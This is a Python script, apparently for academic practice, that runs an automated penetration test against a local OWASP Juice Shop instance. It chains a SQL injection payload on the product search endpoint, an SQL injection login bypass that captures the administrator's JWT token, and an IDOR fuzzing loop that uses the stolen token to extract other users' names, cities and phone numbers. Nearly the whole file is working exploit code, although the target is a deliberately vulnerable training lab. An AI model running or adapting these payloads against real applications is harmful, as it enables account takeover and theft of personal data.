import requests
import json
import time
from datetime import datetime

# Target Configuration (OWASP Juice Shop Local Container)
TARGET_URL = "http://localhost:3000"

def create_report_header():
    """Generates a professional header for the penetration testing audit report."""
    header = f"""======================================================================
🛡️ AUTOMATED API PENETRATION TESTING REPORT
======================================================================
Generated on : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Target Scope : {TARGET_URL}
Auditor      : Mohammad
Classification: CONFIDENTIAL / ACADEMIC RESEARCH SECURITY AUDIT
----------------------------------------------------------------------
"""
    print(header)
    with open("api_report.txt", "w", encoding="utf-8") as report:
        report.write(header)

def log_to_report(message):
    """Prints status logs to the console and appends them to the persistent report file."""
    timestamp = datetime.now().strftime('%H:%M:%S')
    formatted_msg = f"[{timestamp}] {message}"
    print(formatted_msg)
    with open("api_report.txt", "a", encoding="utf-8") as report:
        report.write(formatted_msg + "\n")

def run_penetration_pipeline():
    create_report_header()
    
    log_to_report("[+] Initializing offensive security pipeline against target scope...")
    time.sleep(1)

    # ----------------------------------------------------------------------
    # PHASE 1: SQL Injection (SQLi) Detection on Product Search Endpoint
    # ----------------------------------------------------------------------
    log_to_report("[~] Launching Module 1: Testing Product Search Parameter for SQLi...")
    sqli_payload = "')) OR 1=1 --"
    search_endpoint = f"{TARGET_URL}/rest/products/search"
    
    try:
        response = requests.get(search_endpoint, params={'q': sqli_payload}, timeout=7)
        if response.status_code == 200 and "data" in response.text:
            log_to_report("[🚨] CRITICAL FLAW: SQL Injection confirmed on Search Parameter!")
            log_to_report(f"[+] Payload deployed: {sqli_payload}")
            log_to_report(f"[+] Server Response Length: {len(response.text)} characters.")
        else:
            log_to_report("[-] Module 1 Complete: Endpoint appears resilient against basic parameter breaking.")
    except requests.exceptions.RequestException as e:
        log_to_report(f"[-] Connection Error during Module 1: {str(e)}")
        return

    # ----------------------------------------------------------------------
    # PHASE 2: Broken Authentication via SQLi Authentication Bypass
    # ----------------------------------------------------------------------
    log_to_report("[~] Launching Module 2: Testing POST Login Parameters for Auth Bypass...")
    login_endpoint = f"{TARGET_URL}/rest/user/login"
    auth_payload = {
        "email": "' OR 1=1 --",
        "password": "arbitrary_password_xyz"
    }
    
    jwt_token = None
    try:
        auth_response = requests.post(login_endpoint, json=auth_payload, timeout=7)
        if auth_response.status_code == 200:
            log_to_report("[🚨] EXPLOIT SUCCESS: Authentication controls completely bypassed!")
            log_to_report(f"[+] Deployed auth string injection via email parameter.")
            
            # Parsing the JSON response to harvest the administrative JWT bearer session
            response_json = auth_response.json()
            jwt_token = response_json.get('authentication', {}).get('token')
            admin_email = response_json.get('authentication', {}).get('email')
            
            log_to_report(f"[+] Administrative Account Hijacked: {admin_email}")
            log_to_report(f"[+] Captured Active JWT Bearer Token: {jwt_token[:30]}...[TRUNCATED]")
        else:
            log_to_report("[-] Module 2 Complete: SQLi Authentication Bypass failed.")
    except requests.exceptions.RequestException as e:
        log_to_report(f"[-] Connection Error during Module 2: {str(e)}")
        return

    # ----------------------------------------------------------------------
    # PHASE 3: Broken Object Level Authorization (BOLA / IDOR) Fuzzing Matrix
    # ----------------------------------------------------------------------
    if not jwt_token:
        log_to_report("[-] Pipeline Terminated: BOLA scanning requires a valid hijacked authorization token.")
        return

    log_to_report("[~] Launching Module 3: Initializing Authenticated BOLA Fuzzing Chain...")
    
    # Injecting the stolen JWT token securely into standard HTTP Header mappings
    http_headers = {
        "Authorization": f"Bearer {jwt_token}",
        "Accept": "application/json",
        "Content-Type": "application/json"
    }

    # Fuzzing customer record resource IDs sequentially to map unauthorized data access
    leaked_records_count = 0
    for resource_id in range(1, 6):
        bola_endpoint = f"{TARGET_URL}/api/Addresss/{resource_id}"
        log_to_report(f"[~] Fuzzing Resource Identifier mapping: User Address ID #{resource_id}")
        
        try:
            bola_response = requests.get(bola_endpoint, headers=http_headers, timeout=5)
            if bola_response.status_code == 200:
                user_data = bola_response.json().get('data', {})
                log_to_report(f"[🚨] BOLA ACCESS CONFIRMED: Exfiltrating private profile maps for ID {resource_id}!")
                log_to_report(f"    ➡️ Leaked Full Name : {user_data.get('name', 'N/A')}")
                log_to_report(f"    ➡️ Leaked City/Loc  : {user_data.get('city', 'N/A')}")
                log_to_report(f"    ➡️ Leaked Phone Num : {user_data.get('phone', 'N/A')}")
                leaked_records_count += 1
            elif bola_response.status_code in [401, 403]:
                log_to_report(f"[-] Object ID {resource_id}: Request blocked. Access control enforces validation.")
            elif bola_response.status_code == 404:
                log_to_report(f"[-] Object ID {resource_id}: Record not found in database registry.")
            else:
                log_to_report(f"[-] Object ID {resource_id}: Server returned status code {bola_response.status_code}")
        except requests.exceptions.RequestException as e:
            log_to_report(f"[-] Timeout/Error fuzzing resource index {resource_id}")

    # ----------------------------------------------------------------------
    # PIPELINE CLOSURE & SUMMARY METRICS
    # ----------------------------------------------------------------------
    log_to_report("----------------------------------------------------------------------")
    log_to_report("[+] Automated security evaluation pipeline execution finalized.")
    log_to_report(f"[+] Total Critical Vulnerabilities Chained: 3")
    log_to_report(f"[+] Total Private Customer Records Exfiltrated: {leaked_records_count}")
    log_to_report("======================================================================")
    log_to_report("[+] Persistent audit trail successfully exported to 'api_report.txt'.")

if __name__ == "__main__":
    run_penetration_pipeline()
